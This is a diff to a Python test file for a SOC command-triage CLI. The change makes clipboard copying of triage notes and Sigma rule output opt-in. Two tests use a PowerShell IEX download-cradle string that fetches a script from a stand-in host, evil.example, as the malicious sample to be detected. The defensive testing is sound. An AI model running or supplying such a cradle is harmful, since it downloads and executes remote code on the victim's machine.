@@ -169,7 +169,7 @@ class TestSmartTriageDefaultsAndGroupedHelp(unittest.TestCase):
         self.assertIn("Output & Detection", help_text)
         self.assertIn("Benchmark & Advanced", help_text)
 
-    def test_interactive_tty_auto_copies_ticket_note_and_no_copy_opts_out(self) -> None:
+    def test_interactive_tty_does_not_auto_copy_unless_copy_note_passed(self) -> None:
         copied: list[str] = []
         buf1 = io.StringIO()
         with (
@@ -179,8 +179,7 @@ class TestSmartTriageDefaultsAndGroupedHelp(unittest.TestCase):
         ):
             rc1 = cli_main(["-c", "ipconfig /all", "--no-color"])
         self.assertEqual(rc1, 0)
-        self.assertEqual(len(copied), 1)
-        self.assertIn("[SOC TRIAGE NOTE", copied[0])
+        self.assertEqual(copied, [])
 
         copied.clear()
         buf2 = io.StringIO()
@@ -189,24 +188,25 @@ class TestSmartTriageDefaultsAndGroupedHelp(unittest.TestCase):
             redirect_stdout(buf2),
             patch.object(buf2, "isatty", return_value=True),
         ):
-            rc2 = cli_main(["-c", "ipconfig /all", "--no-color", "--no-copy"])
+            rc2 = cli_main(["-c", "ipconfig /all", "--no-color", "--copy-note"])
         self.assertEqual(rc2, 0)
-        self.assertEqual(copied, [])
+        self.assertEqual(len(copied), 1)
+        self.assertIn("[SOC TRIAGE NOTE", copied[0])
 
-    def test_non_benign_pretty_auto_emits_sigma_and_no_sigma_opts_out(self) -> None:
+    def test_non_benign_pretty_sigma_is_strictly_opt_in(self) -> None:
         mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
         buf1 = io.StringIO()
         with redirect_stdout(buf1), patch.object(buf1, "isatty", return_value=True):
-            rc1 = cli_main(["-c", mal_cmd, "--no-color", "--no-copy"])
+            rc1 = cli_main(["-c", mal_cmd, "--no-color"])
         self.assertEqual(rc1, 0)
-        self.assertIn("logsource:", buf1.getvalue())
-        self.assertIn("detection:", buf1.getvalue())
+        self.assertNotIn("logsource:", buf1.getvalue())
 
         buf2 = io.StringIO()
         with redirect_stdout(buf2), patch.object(buf2, "isatty", return_value=True):
-            rc2 = cli_main(["-c", mal_cmd, "--no-color", "--no-copy", "--no-sigma"])
+            rc2 = cli_main(["-c", mal_cmd, "--no-color", "--sigma"])
         self.assertEqual(rc2, 0)
-        self.assertNotIn("logsource:", buf2.getvalue())
+        self.assertIn("logsource:", buf2.getvalue())
+        self.assertIn("detection:", buf2.getvalue())
 
     def test_json_and_jsonl_stdout_remain_pure(self) -> None:
         mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
